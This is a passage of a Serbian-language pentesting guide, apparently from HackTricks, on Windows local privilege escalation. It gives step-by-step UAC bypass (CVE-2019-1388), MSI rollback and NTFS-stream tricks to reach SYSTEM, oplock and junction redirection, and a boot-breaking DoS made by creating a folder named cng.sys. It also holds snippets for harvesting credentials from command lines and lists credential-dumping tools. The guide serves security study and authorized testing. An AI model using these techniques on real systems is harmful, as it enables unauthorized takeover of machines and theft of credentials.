Takođe, sledeći alat omogućava da **presretnete komunikaciju preko named pipe-a pomoću alata kao što je burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava listanje i pregled svih pipe-ova da biste pronašli privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Ostalo

### Ekstenzije fajlova koje mogu izvršavati stvari u Windowsu

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### **Praćenje komandnih linija zbog lozinki**

Kada dobijete shell kao korisnik, mogu postojati zakazani zadaci ili drugi procesi koji se izvršavaju i koji **prosleđuju kredencijale na komandnoj liniji**. Skripta ispod snima komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim, ispisujući sve razlike.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Krađa lozinki iz procesa

## Od Low Priv User do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko konzole ili RDP) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao "NT\AUTHORITY SYSTEM" iz naloga bez privilegija.

Ovo omogućava eskalaciju privilegija i zaobilaženje UAC-a istovremeno istom ranjivošću. Dodatno, nema potrebe ništa instalirati, a binarni fajl koji se koristi tokom procesa je potpisan i izdat od strane Microsoft-a.

Neki od pogođenih sistema su sledeći:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Pročitajte ovo da biste naučili o Integrity Levels:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim pročitajte ovo da biste naučili o UAC i UAC bypass-ovima:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Tehnika opisana u [**ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) sa exploit kodom [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Napad se u suštini sastoji od zloupotrebe rollback funkcije Windows Installer-a da zameni legitimne fajlove malicioznim tokom procesa deinstalacije. Za ovo napadač mora da kreira **malicious MSI installer** koji će biti korišćen za hijackovanje `C:\Config.Msi` foldera, koji će kasnije Windows Installer koristiti za čuvanje rollback fajlova tokom deinstalacije drugih MSI paketa gde bi rollback fajlovi bili izmenjeni da sadrže maliciozni payload.

Sažeta tehnika izgleda ovako:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Kreirajte `.msi` koji instalira bezopasan fajl (npr. `dummy.txt`) u folder koji je upisiv (`TARGETDIR`).
- Obeležite installer kao **"UAC Compliant"**, tako da ga **non-admin user** može pokrenuti.
- Zadržite otvoren **handle** ka fajlu nakon instalacije.

- Step 2: Begin Uninstall
- Deinstalirajte isti `.msi`.
- Proces deinstalacije počinje da prebacije fajlove u `C:\Config.Msi` i preimenuje ih u `.rbf` fajlove (rollback backup-ove).
- **Poll the open file handle** koristeći `GetFinalPathNameByHandle` da detektujete kada fajl postane `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` uključuje **custom uninstall action (`SyncOnRbfWritten`)** koja:
- Signalizuje kada je `.rbf` zapisan.
- Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Step 4: Block Deletion of `.rbf`
- Kada je signal primljen, **otvorite `.rbf` fajl** bez `FILE_SHARE_DELETE` — ovo **sprečava njegovo brisanje**.
- Zatim **signalizirajte nazad** tako da deinstalacija može da se završi.
- Windows Installer ne uspeva da obriše `.rbf`, i pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` nije uklonjen**.

- Step 5: Manually Delete `.rbf`
- Vi (napadač) ručno obrišete `.rbf` fajl.
- Sada je **`C:\Config.Msi` prazan**, spreman za hijack.

> U ovoj tački, **trigger the SYSTEM-level arbitrary folder delete vulnerability** da obrišete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Ponovo kreirajte `C:\Config.Msi` folder sami.
- Postavite **weak DACLs** (npr. Everyone:F), i **zadržite otvoren handle** sa `WRITE_DAC`.

- Step 7: Run Another Install
- Ponovo instalirajte `.msi`, sa:
- `TARGETDIR`: lokacija u koju se može pisati.
- `ERROROUT`: promenljiva koja izaziva prisilni failure.
- Ova instalacija će se koristiti da ponovo trigger-uje **rollback**, koji čita `.rbs` i `.rbf`.

- Step 8: Monitor for `.rbs`
- Koristite `ReadDirectoryChangesW` da nadgledate `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
- Zabeležite njegovo ime fajla.

- Step 9: Sync Before Rollback
- `.msi` sadrži **custom install action (`SyncBeforeRollback`)** koja:
- Signalizuje događaj kada je `.rbs` kreiran.
- Zatim **čeka** pre nego što nastavi.

- Step 10: Reapply Weak ACL
- Nakon primanja događaja ` .rbs created`:
- Windows Installer **ponovo primenjuje strong ACLs** na `C:\Config.Msi`.
- Ali zato što i dalje imate handle sa `WRITE_DAC`, možete ponovo **primeniti weak ACLs**.

> ACLs se **primenjuju samo pri otvaranju handle-a**, tako da i dalje možete da pišete u folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite-ujte `.rbs` fajl lažnim rollback skriptom koji govori Windows-u da:
- Restore-uje vaš `.rbf` fajl (maliciozni DLL) u **privileged location** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop-ujte svoj lažni `.rbf` koji sadrži **maliciozni SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signalizirajte sync event da installer nastavi.
- A **type 19 custom action (`ErrorOut`)** je konfigurisan da **namerno prekine instalaciju** u poznatoj tački.
- Ovo izaziva početak **rollback-a**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Read-uje vaš maliciozni `.rbs`.
- Kopira vaš `.rbf` DLL u ciljnu lokaciju.
- Sada imate svoj **maliciozni DLL u SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Pokrenite trusted **auto-elevated binary** (npr. `osk.exe`) koji učitava DLL koji ste hijackovali.
- **Boom**: vaš kod se izvršava **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete obrisati **čitav folder** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost dozvoljava samo **arbitrary file deletion**?

Možete iskoristiti **NTFS internals**: svaki folder ima skriven alternate data stream koji se zove:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ovaj stream čuva **indeksne metapodatke** direktorijuma.

Dakle, ako **obrišete `::$INDEX_ALLOCATION` stream** direktorijuma, NTFS **uklanja ceo direktorijum** iz fajl sistema.

Ovo možete uraditi pomoću standardnih API-ja za brisanje fajlova, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Iako pozivate *file* delete API, ono **briše sam folder**.

### From Folder Contents Delete to SYSTEM EoP
Šta ako vaš primitive ne dozvoljava brisanje proizvoljnih files/folders, ali ono **dozvoljava brisanje *contents* attacker-controlled folder-a**?

1. Step 1: Postavite bait folder i file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Postavite **oplock** na `file1.txt`
- The oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira foldere (npr., `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada dođe do `file1.txt`, the **oplock triggers** i predaje kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
- Ovo prazni `folder1` bez prekidanja oplock-a.
- Nemojte direktno brisati `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Ovo cilja NTFS internal stream koji čuva metapodatke foldera — brisanjem njega briše se folder.

5. Korak 5: Oslobodite oplock
- Proces SYSTEM nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink, on zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od Arbitrary Folder Create do trajnog DoS

Iskoristite primitiv koji vam omogućava **create an arbitrary folder as SYSTEM/admin** — čak i ako **ne možete pisati fajlove** ili **postaviti slabe dozvole**.

Kreirajte **folder** (ne fajl) sa imenom **kritičnog Windows drivera**, npr.:
```
C:\Windows\System32\cng.sys
```
- Ovaj put obično odgovara kernel-mode drajveru `cng.sys`.
- Ako ga **unapred kreirate kao folder**, Windows neće uspeti da učita stvarni drajver pri pokretanju sistema.
- Zatim, Windows pokušava da učita `cng.sys` tokom pokretanja.
- Vidi folder, **ne uspeva da razreši stvarni drajver**, i **sruši se ili zaustavi pokretanje**.
- Nema **rezervne opcije (fallback)**, i nema **oporavka** bez spoljne intervencije (npr. popravka pokretanja ili pristupa disku).


## **From High Integrity to System**

### **New service**

Ako već radite u procesu sa High Integrity, **put to SYSTEM** može biti jednostavan — dovoljno je samo **kreirati i pokrenuti novi service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Prilikom kreiranja service binarnog fajla uverite se da je validan service ili da binarni fajl izvrši potrebne radnje brzo, jer će biti ugašen nakon 20s ako nije validan service.

### AlwaysInstallElevated

Iz High Integrity procesa možete pokušati da **omogućite AlwaysInstallElevated registry unose** i **instalirate** reverse shell koristeći _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ako imate te token privilegije (verovatno ćete ih naći u već postojećem High Integrity procesu), bićete u mogućnosti da **otvorite gotovo bilo koji process** (ne zaštićene procese) koristeći SeDebug privilegiju, **kopirate token** procesa i kreirate **proizvoljan process sa tim tokenom**.\
Korišćenjem ove tehnike obično se bira bilo koji process koji se izvršava kao SYSTEM sa svim token privilegijama (_da, možete naći SYSTEM procese bez svih token privilegija_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Tehnika se sastoji u **kreiranju pipe-a i potom kreiranju/zloupotrebi service-a da upiše u tu pipe**. Zatim, **server** koji je kreirao pipe koristeći **`SeImpersonate`** privilegiju biće u stanju da **impersonira token** pipe klijenta (service) i time dobije SYSTEM privilegije.\
Ako želite da [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijack-ujete dll** koji se **učitava** u **process** koji se izvršava kao **SYSTEM**, moći ćete da izvršavate proizvoljan kod sa tim privilegijama. Stoga je Dll Hijacking koristan za ovu vrstu eskalacije privilegija, i, što je još važnije, daleko **lakši za postizanje iz High Integrity procesa** jer će imati **write permissions** na folderima koji se koriste za učitavanje dll-ova.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava za misconfigurations i osetljive fajlove (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovano.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava moguće misconfigurations i prikuplja informacije (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava za misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izdvaja sačuvane sesije iz PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstrahuje kredencijale iz Credential Manager-a. Detektovano.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spraya prikupljene lozinke kroz domen**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer i man-in-the-middle alat.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows privesc enumeracija**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Pretražuje poznate privesc ranjivosti (ZASTARELO, koristi se Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Potrebna Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Pretražuje poznate privesc ranjivosti (potrebno kompajlirati koristeći VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host tražeći misconfigurations (više alat za prikupljanje informacija nego za privesc) (potrebno kompajlirati) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstrahuje kredencijale iz mnogih softvera (precompiled exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Proverava za misconfigurations (izvršni fajl precompiled na github-u). Nije preporučeno. Loše radi na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće misconfigurations (exe iz python-a). Nije preporučeno. Loše radi na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog posta (ne zahteva accesschk da bi pravilno radio ali ga može koristiti).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita output **systeminfo** i preporučuje radne exploite (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita output **systeminfo** i preporučuje radne exploite (lokalni python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Literatura

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
